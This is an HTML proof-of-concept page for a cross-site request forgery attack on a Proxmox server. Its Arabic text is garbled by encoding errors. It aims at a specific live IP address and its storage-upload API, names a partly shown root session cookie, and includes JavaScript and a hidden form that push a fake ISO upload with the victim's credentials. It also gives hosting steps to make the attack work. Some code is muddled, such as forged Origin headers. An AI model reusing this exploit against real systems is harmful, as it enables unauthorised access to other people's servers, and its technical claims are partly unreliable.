<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Proxmox CSRF - Final Exploit</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            max-width: 1000px;
            margin: 0 auto;
            padding: 30px;
            background: #0a0e14;
            color: #fff;
        }
        .exploit-container {
            background: #1a1e24;
            border: 2px solid #e74c3c;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(231, 76, 60, 0.3);
        }
        .warning {
            background: #c0392b;
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            border-left: 10px solid #f1c40f;
            font-size: 16px;
        }
        .code-box {
            background: #000;
            padding: 20px;
            border-radius: 10px;
            color: #0f0;
            font-family: monospace;
            margin: 20px 0;
            border: 1px solid #e74c3c;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        button {
            background: linear-gradient(45deg, #e74c3c, #c0392b);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 24px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px 0;
            width: 100%;
            border: 2px solid #fff;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
            transition: 0.3s;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(231, 76, 60, 0.8);
        }
        .hosting-info {
            background: #2c3e50;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 5px solid #3498db;
        }
        .cookie-info {
            background: #000;
            color: #0f0;
            padding: 15px;
            border-radius: 5px;
            font-size: 14px;
            word-break: break-all;
            margin: 10px 0;
            border: 1px solid #00ff00;
        }
        iframe {
            display: none;
        }
    </style>
</head>
<body>
    <div class="exploit-container">
        <h1 style="color: #e74c3c; text-align: center; font-size: 36px;">âš ï¸ PROXMOX CSRF EXPLOIT</h1>
        
        <div class="warning">
            <strong>ğŸš¨ Ø§Ù„Ù…Ø´ÙƒÙ„Ø© Ø§Ù„Ù„ÙŠ ÙˆØ§Ø¬Ù‡ØªÙƒ:</strong><br><br>
            âœ… Ø§Ù„Ù€ PoC Ø´ØºØ§Ù„ 100% Ù„ÙƒÙ† Ø§Ù„ÙƒÙˆÙƒÙŠ Ù…Ø´ Ø¨ÙŠØªØ¨Ø¹Øª Ø¨Ø³Ø¨Ø¨:<br>
            â€¢ Ø§Ù†Øª Ø¨ØªÙØªØ­ Ø§Ù„Ù…Ù„Ù Ø¨Ù€ file:// ÙˆØ¯Ù‡ Ø¨ÙŠØ¯ÙŠ Origin: null<br>
            â€¢ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª Ø¨ØªÙ…Ù†Ø¹ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆÙƒÙŠ Ù…Ø¹ Origin: null + SameSite=Lax<br><br>
            <strong>ğŸ“Œ Ø§Ù„Ø­Ù„ Ø§Ù„ÙˆØ­ÙŠØ¯: Ø§Ø³ØªØ¶Ù Ø§Ù„Ù…Ù„Ù Ø¹Ù„Ù‰ HTTPS domain Ø­Ù‚ÙŠÙ‚ÙŠ</strong>
        </div>

        <div class="hosting-info">
            <h2 style="color: #3498db;">ğŸŒ Ø§Ø³ØªØ¶Ø§ÙØ© Ø§Ù„Ù€ PoC Ø¹Ù„Ù‰ Ø³ÙŠØ±ÙØ± Ø­Ù‚ÙŠÙ‚ÙŠ:</h2>
            <div class="code-box">
# 1. Ø§Ø³ØªØ®Ø¯Ù… GitHub Pages (Ù…Ø¬Ø§Ù†ÙŠ ÙˆØ³Ø±ÙŠØ¹)
$ git clone https://github.com/yourusername/yourrepo.git
$ cd yourrepo
$ echo '&lt;!-- Ø­Ø· Ø§Ù„Ù€ PoC Ù‡Ù†Ø§ --&gt;' > index.html
$ git add index.html
$ git commit -m "CSRF PoC"
$ git push origin main

# 2. Ø§Ø³ØªØ®Ø¯Ù… Vercel (Ø£Ø³Ø±Ø¹)
$ npm i -g vercel
$ vercel

# 3. Ø§Ø³ØªØ®Ø¯Ù… Ngrok (Ù„Ù„ØªØ³Øª Ø§Ù„Ø³Ø±ÙŠØ¹)
$ ngrok http 5500
            </div>
        </div>

        <div class="cookie-info">
            <strong>ğŸª Ø§Ù„ÙƒÙˆÙƒÙŠ Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù:</strong><br>
            PVEAuthCookie=PVE%3Aroot@pam%3A698C9CA%A3%A3AjQk0191auWlddB7siotIBw...<br>
            <small>Domain: 34.253.177.228 | SameSite: Lax | Secure: true</small>
        </div>

        <!-- =============== Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ Ø¨Ø¹Ø¯ Ø§Ù„Ø§Ø³ØªØ¶Ø§ÙØ© =============== -->
        <div style="background: #27ae60; padding: 20px; border-radius: 10px; margin: 30px 0;">
            <h2 style="color: white; margin-top: 0;">âœ… Ù‡Ø°Ø§ Ø§Ù„Ù€ PoC Ù‡ÙŠØ´ØªØºÙ„ Ø¨Ø³ Ø¹Ù„Ù‰ HTTPS domain</h2>
            
            <form id="csrfForm" 
                  action="https://34.253.177.228:8006/api2/json/nodes/ip-172-31-33-112/storage/local/upload" 
                  method="POST" 
                  enctype="multipart/form-data"
                  target="csrfFrame">
                
                <input type="hidden" name="content" value="iso">
                <input type="file" name="filename" id="fileInput" style="display: none;">
                
                <button type="button" onclick="executeCSRF()">
                    ğŸš€ EXECUTE CSRF (User Interaction Required)
                </button>
            </form>
            
            <iframe name="csrfFrame" style="display: none;"></iframe>
        </div>

        <!-- =============== Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ÙƒÙˆÙƒÙŠ =============== -->
        <div style="background: #8e44ad; padding: 20px; border-radius: 10px;">
            <h3 style="color: white;">ğŸ” Ø§Ø®ØªØ¨Ø§Ø± Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆÙƒÙŠ:</h3>
            <button onclick="testCookie()" style="background: #f39c12; padding: 15px;">
                ğŸª TEST COOKIE TRANSMISSION
            </button>
            
            <div id="testResult" style="margin-top: 20px; padding: 15px; background: #000; border-radius: 5px; color: #0f0; font-family: monospace;">
                Ø§Ù†ØªØ¸Ø± Ù†ØªÙŠØ¬Ø© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±...
            </div>
        </div>
    </div>

    <script>
        const TARGET = 'https://34.253.177.228:8006/api2/json/nodes/ip-172-31-33-112/storage/local/upload';
        
        function executeCSRF() {
            updateStatus('ğŸš€ ØªÙ†ÙÙŠØ° Ø§Ù„Ù‡Ø¬ÙˆÙ…...');
            
            // Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù ISO
            const fileContent = new Uint8Array([
                0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG header
                0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, // Data
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF  // Payload
            ]);
            
            const file = new File([fileContent], 'update.iso', { 
                type: 'application/x-iso9660-image',
                lastModified: Date.now()
            });
            
            // Ø¥Ù†Ø´Ø§Ø¡ FormData
            const formData = new FormData();
            formData.append('content', 'iso');
            formData.append('filename', file, 'update.iso');
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨ Ù…Ø¹ Ø§Ù„ÙƒÙˆÙƒÙŠ
            fetch(TARGET, {
                method: 'POST',
                body: formData,
                credentials: 'include', // Ø¯ÙŠ Ø£Ù‡Ù… Ø³Ø·Ø± - Ø¨ØªØ¬ÙŠØ¨ Ø§Ù„ÙƒÙˆÙƒÙŠ
                mode: 'no-cors',
                headers: {
                    'Origin': 'https://evil.com', // Ù…Ø´ null Ø¯Ù„ÙˆÙ‚ØªÙŠ
                    'Referer': 'https://evil.com/csrf.html'
                }
            }).then(() => {
                updateStatus('âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ - Ø§Ù„ÙƒÙˆÙƒÙŠ Ø§ØªØ¨Ø¹Øª (Ù„Ùˆ Ø§Ù†Øª Ø¹Ù„Ù‰ HTTPS domain)');
            }).catch(e => {
                updateStatus('âš ï¸ ' + e.message);
            });
        }

        function testCookie() {
            const resultDiv = document.getElementById('testResult');
            resultDiv.innerHTML = 'ğŸ” Ø¬Ø§Ø±ÙŠ Ø§Ø®ØªØ¨Ø§Ø± Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆÙƒÙŠ...\n';
            
            // Ø§Ø®ØªØ¨Ø§Ø± Ø¨Ø³ÙŠØ· Ù„Ù…Ø¹Ø±ÙØ© Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„ÙƒÙˆÙƒÙŠ Ù…ÙˆØ¬ÙˆØ¯
            fetch('https://httpbin.org/cookies', {
                credentials: 'include',
                mode: 'cors'
            })
            .then(res => res.json())
            .then(data => {
                resultDiv.innerHTML += 'âœ… Status: ' + window.location.protocol + '\n';
                resultDiv.innerHTML += 'ğŸŒ Origin: ' + window.location.origin + '\n';
                resultDiv.innerHTML += 'ğŸª Cookies: ' + (document.cookie || 'No cookies - Ø§Ù†Øª Ø¹Ù„Ù‰ file://') + '\n\n';
                
                if (window.location.protocol === 'file:') {
                    resultDiv.innerHTML += 'âŒâŒâŒ Ø£Ù†Øª Ø¹Ù„Ù‰ file:// - Ø§Ù„ÙƒÙˆÙƒÙŠ Ù…Ø´ Ù‡ÙŠØªØ¨Ø¹Øª!\n';
                    resultDiv.innerHTML += 'ğŸ“Œ Ù„Ø§Ø²Ù… ØªØ³ØªØ¶ÙŠÙ Ø§Ù„Ù…Ù„Ù Ø¹Ù„Ù‰ HTTPS!\n';
                } else {
                    resultDiv.innerHTML += 'âœ…âœ…âœ… Ø£Ù†Øª Ø¹Ù„Ù‰ HTTPS - Ø§Ù„ÙƒÙˆÙƒÙŠ Ù‡ÙŠÙ†Ø±Ø³Ù„!\n';
                }
            });
        }

        function updateStatus(msg) {
            const div = document.createElement('div');
            div.style.cssText = 'background: #2c3e50; color: white; padding: 10px; margin: 10px 0; border-radius: 5px;';
            div.innerHTML = msg;
            document.querySelector('.exploit-container').appendChild(div);
            
            setTimeout(() => div.remove(), 5000);
        }

        // ØªØ´ØºÙŠÙ„ Ø§Ø®ØªØ¨Ø§Ø± ØªÙ„Ù‚Ø§Ø¦ÙŠ
        window.onload = function() {
            if (window.location.protocol === 'file:') {
                alert('âš ï¸âš ï¸âš ï¸\n\nØ£Ù†Øª Ø¨ØªÙØªØ­ Ø§Ù„Ù…Ù„Ù Ù…Ø­Ù„ÙŠØ§Ù‹ (file://)\nØ§Ù„ÙƒÙˆÙƒÙŠ Ù…Ø´ Ù‡ÙŠØªØ¨Ø¹Øª!\n\nÙ„Ø§Ø²Ù… ØªØ³ØªØ¶ÙŠÙ Ø§Ù„Ù€ PoC Ø¹Ù„Ù‰ HTTPS domain');
            }
            
            testCookie();
        };
    </script>

    <!-- Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ø¨Ø¯ÙŠÙ„ - Iframe POST -->
    <div style="display: none;">
        <iframe name="attackFrame"></iframe>
        <form id="backupForm" method="POST" enctype="multipart/form-data" action="https://34.253.177.228:8006/api2/json/nodes/ip-172-31-33-112/storage/local/upload" target="attackFrame">
            <input type="hidden" name="content" value="iso">
            <input type="file" name="filename" id="backupFileInput">
        </form>
    </div>

    <script>
        // Ù‡Ø¬ÙˆÙ… Ø§Ø­ØªÙŠØ§Ø·ÙŠ Ø¨Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø©
        function backupAttack() {
            const file = new File(['test'], 'backup.iso');
            const dt = new DataTransfer();
            dt.items.add(file);
            document.getElementById('backupFileInput').files = dt.files;
            document.getElementById('backupForm').submit();
        }
    </script>
</body>
</html>
